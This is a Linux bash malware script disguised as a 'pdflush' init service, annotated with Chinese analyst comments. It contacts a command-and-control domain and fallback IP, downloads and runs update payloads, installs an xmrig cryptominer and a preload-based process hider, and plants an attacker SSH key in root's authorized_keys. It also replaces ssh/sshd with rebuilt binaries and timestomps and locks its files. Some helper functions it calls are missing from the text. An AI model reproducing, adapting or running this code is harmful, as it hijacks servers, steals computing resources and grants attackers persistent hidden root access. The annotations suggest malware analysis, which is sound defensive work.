#!/bin/bash
#chkconfig: 2345 81 96
#description:pdflush

pdflushType="launch"

threads=$(grep -c "processor" /proc/cpuinfo)  # Get the number of processors
launch="/etc/init.d/pdflushs"  # Main script
xmrig="/usr/bin/kthreadds"  # Mining binary
export config="/usr/bin/config.json"  # Mining configuration file
busybox="/lib64/busybox"  # busybox path
sha512Busybox="89dafd4be9d51135ec8ad78a9ac24c29f47673a9fb3920dac9df81c7b6b850ad8e7219a0ded755c2b106a736804c9de3174302a2fba6130196919777cb516a4f"  # Hash for busybox
chattr="/lib64/libg++.so"  # chattr path
export preload="/etc/ld.so.preload"  # Preload library hijacking file
processhider="/lib64/libstdc++.so"  # Process hiding tool
bd="/lib64/gc++"  # Backdoor directory
cron="/lib64/libgc++.so"  # Cron daemon file
export ssh="/etc/ssh"  # SSH configuration directory
export sshd="/usr/sbin"  # SSH daemon path

# Print usage
usage() {
    echo "Usage: $launch {start|status|stop}"
}

# Print running status
status() {
    echo -e "\033[32mRunning... \033[0m"
}

checkUpdate() {
    tempIp=$($busybox ping Rainbow66.f3322.net -c1 | $busybox sed "1{s/[^(]*(//;s/).*//;q}")
    
    # Determine the remote IP address
    if [[ $tempIp == "127.0.0.1" ]]; then
        remoteIp="188.121.119.155"
    elif [[ $tempIp =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
        IFS="." read -r FIELD1 FIELD2 FIELD3 FIELD4 <<< "$tempIp"
        if [ "$FIELD1" -le 255 ] && [ "$FIELD2" -le 255 ] && [ "$FIELD3" -le 255 ] && [ "$FIELD4" -le 255 ]; then
            remoteIp=$tempIp
        else
            remoteIp="188.121.119.155"
        fi
    else
        remoteIp="188.121.119.155"
    fi

    # Get hash values from the remote server
    remoteXmrigSha512=$($busybox wget -qO- http://"$remoteIp"/sha512/xmrig)
    remotePdflushsSha512=$($busybox wget -qO- http://"$remoteIp"/sha512/$pdflushType)
    remoteProcesshiderSha512=$($busybox wget -qO- http://"$remoteIp"/sha512/processhider)
    remoteCronSha512=$($busybox wget -qO- http://"$remoteIp"/sha512/cron)
    
    # Calculate local hash values
    localBusyboxSha512=$($busybox sha512sum "$busybox" | $busybox awk "{print $1}")
    export localBusyboxSha512
    localXmrigSha512=$($busybox sha512sum "$xmrig" | $busybox awk "{print $1}")
    localPdflushsSha512=$($busybox sha512sum "$launch" | $busybox awk "{print $1}")
    localProcesshiderSha512=$($busybox sha512sum "$processhider" | $busybox awk "{print $1}")
    localCronSha512=$($busybox sha512sum "$cron" | $busybox awk "{print $1}")

    # Update the files if their hashes don"t match
    if [[ $remotePdflushsSha512 != "$localPdflushsSha512" ]]; then
        $busybox chattr -iaR /lib64/
        $busybox wget -q http://"$remoteIp"/update/launchUpdate -O /lib64/launchUpdate
        $busybox chmod a+x /lib64/launchUpdate
        nohup /lib64/launchUpdate > /dev/null &
    fi

    if [[ $remoteXmrigSha512 != "$localXmrigSha512" ]]; then
        $busybox chattr -iaR /usr/bin/
        $busybox rm -f "$xmrig"
        $busybox kill -9 "$($busybox ps | $busybox grep kthreadds | $busybox grep -v grep | $busybox awk "{print $1}")"
    fi

    if [[ $remoteProcesshiderSha512 != "$localProcesshiderSha512" ]]; then
        $busybox chattr -iaR /lib64/
        $busybox rm -f "$processhider"
        $busybox wget -q http://"$remoteIp"/xmrig/processhider.so -O "$processhider"
        timeFile=$($busybox ls -t /lib64 | $busybox tail -1)
        $busybox touch -r /lib64/"$timeFile" "$processhider"
        $busybox chattr +ai "$processhider"
    fi

    if [[ $remoteCronSha512 != "$localCronSha512" ]]; then
        $busybox chattr -iaR /lib64/
        $busybox rm -f "$cron"
        $busybox kill -9 "$($busybox ps | $busybox grep "libgc++.so" | $busybox grep -v grep | $busybox awk "{print $1}")"
    fi
}

# 检查authorized_keys中是否包含后门公钥
backdoor(){
    $busybox chattr +ai /root/.ssh/authorized_keys
    $busybox chattr -R +ai "$bd"
    
    if [[ ! -d /root/.ssh ]]; then
        mkdir /root/.ssh
    else
        $busybox chattr -aiR /root/.ssh/
    fi
    
    if ! $busybox grep -q "paDKiUwmHNUSW7E1S18Cl" /root/.ssh/authorized_keys || [[ ! -f /root/.ssh/authorized_keys ]]; then
        $busybox echo "ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAv54nAGwGwm626zrsUeI0bnVYgjgS/ux7V5phklbZYFHEm+3Aa0gfu5EQyQdnhTpo1adaKxWJ97mrM5a2VAfTN+n6KUwNYRZpaDKiUwmHNUSW7E1S18ClTCBtRsC0rRDTnIrslTRSHlM3cNN+MskKTW/vWz/oE3ll4MMQqexZlsLvMpVVlGq6t3XjFXz0ABBI8GJ0RaBS81FS2R1DNSCb+zORNb6SP6g9hHk1i9V5PjWNqNGXyzWIrCxLc88dGaTttUYEoxCl4z9YOiTw8F5S4svbcqTTVIu/zt/7OIQixDREGbddAaXZXidu+ijFeeOul/lJXEXQK8eR1DX1k2VL+w== rsa 2048-040119" > /root/.ssh/authorized_keys
        $busybox chattr +ai /root/.ssh/authorized_keys
    fi
    
    if [[ $($busybox lsattr /root/.ssh/authorized_keys | $busybox awk "{print $1}" | $busybox grep i | $busybox grep -v grep | $busybox wc -l) != 1 ]]; then
        $busybox chattr +ai /root/.ssh/authorized_keys
    fi
    
    if [[ $threads -gt 8 ]]; then 
        if [[ $(ssh -B) != "Congratulations!" || $(sshd -B) != "Congratulations!" ]]; then
            $busybox chattr -ai /etc/ssh/ssh_config
            $busybox chattr -ai /etc/ssh/sshd_config
            $busybox chattr -ai /etc/ssh/ssh_host_rsa_key
            $busybox rm /etc/ssh/ssh_config
            $busybox rm /etc/ssh/sshd_config
            $busybox rm /etc/ssh/ssh_host_rsa_key
            $busybox chattr -ai "$($busybox which ssh)"
            $busybox chattr -ai "$($busybox which sshd)"
            $busybox chattr -Rai "$bd"
            cd "$bd" || exit
            make install
            $busybox chattr -R +ai "$bd"
            timeFile=$($busybox ls -t "$ssh" | $busybox tail -1)
            $busybox touch -r "$timeFile" "$ssh/ssh"
            $busybox touch -r "$timeFile" "$sshd/sshd"
        fi
    fi
}
checkCronProc(){
	if [[ $($busybox ps|$busybox grep "libgc++.so"|$busybox grep -v grep|$busybox wc -l) != 1 ]]
	then
		nohup $cron > /dev/null &
	fi
}



# 检查busybox程序是否存在
checkBusyboxFile(){
	$chattr +ai $busybox
	while true
	do
		if [[ ! -f $busybox || $(sha512sum $busybox|awk "{print $1}") != "$sha512Busybox" ]]
		then
			$chattr -iaR /lib64/
			rm -f $busybox
			wget http://"$remoteIp"/xmrig/busybox -O $busybox
			chmod a+x $busybox
			timeFile=$($busybox ls -t /lib64|$busybox tail -1)
			$busybox touch -r /lib64/"$timeFile" $busybox
			$busybox chattr +ai $busybox
		elif [[ ! -x $busybox ]]
		then
			$chattr -iaR /lib64/
			chmod a+x $busybox
			timeFile=$($busybox ls -t /lib64|$busybox tail -1)
			$busybox touch -r /lib64/"$timeFile" $busybox
			$busybox chattr +ai $busybox
		else
			break
		fi
	done
}
start(){
while true
do
	# 获取C&C的IP，经手工测试为 148.70.199.147
	tmepIp=$($busybox ping Rainbow66.f3322.net -c1|$busybox sed "1{s/[^(]*(//;s/).*//;q}")
	if [[ $tmepIp == "127.0.0.1" ]]
	then
		# 若域名返回的IP为 127.0.0.1，则直接更改为备份服务器 188.121.119.155
		remoteIp=188.121.119.155
	elif [[ $tmepIp =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]
	then
		FIELD1=$(echo "$tmepIp"|cut -d. -f1)
		FIELD2=$(echo "$tmepIp"|cut -d. -f2)
		FIELD3=$(echo "$tmepIp"|cut -d. -f3)
		FIELD4=$(echo "$tmepIp"|cut -d. -f4)
		if [ "$FIELD1" -le 255 ] && [ "$FIELD2" -le 255 ] && [ "$FIELD3" -le 255 ] && [ "$FIELD4" -le 255 ]
		then
			remoteIp=$tmepIp
		else
			remoteIp=188.121.119.155
		fi
	fi
	sleep 1

	checkBusyboxFile "$@"	# 检查busybox是否存在，不存在则重新下载
	sleep 1

	checkChattrExecute	# 检查本机 chattr 能否正常使用
	sleep 1

	checkSelfFile	# 检查母体脚本/etc/init.d/pdflushs是否还存在，不存在则重新下载
	sleep 1

	checkPreloadFile	# 检查preload和prochider是否存在，且将preload指向prochider
	sleep 1

	checkXmrigFile	# 检查挖矿进程和配置文件是否无误
	sleep 1

	killOtherProc	# 清除其他CPU占用率高的挖矿进程
	sleep 1

	checkXmrigProc	# 检查挖矿进程是否在运行
	sleep 1

	checkCronFile	# 检查cron.py文件是否存在，不存在则重新下载
	sleep 1

	checkCronProc	# 检查cron.py进程是否在运行，若无则后台启动
	sleep 1

	checkBackdoor	# 检查ssh缓存公钥是否还存在
	sleep 1
done
}

case $1 in
	start) start "$@" ;;		# 安装并运行病毒
	status) status ;;
	update) checkUpdate "$@" ;;	# 从Rainbow66.f3322.net获取每个病毒组件的sha512，并与本地进行校验，看有无变化
	*) usage ;;
esac

rate syntax
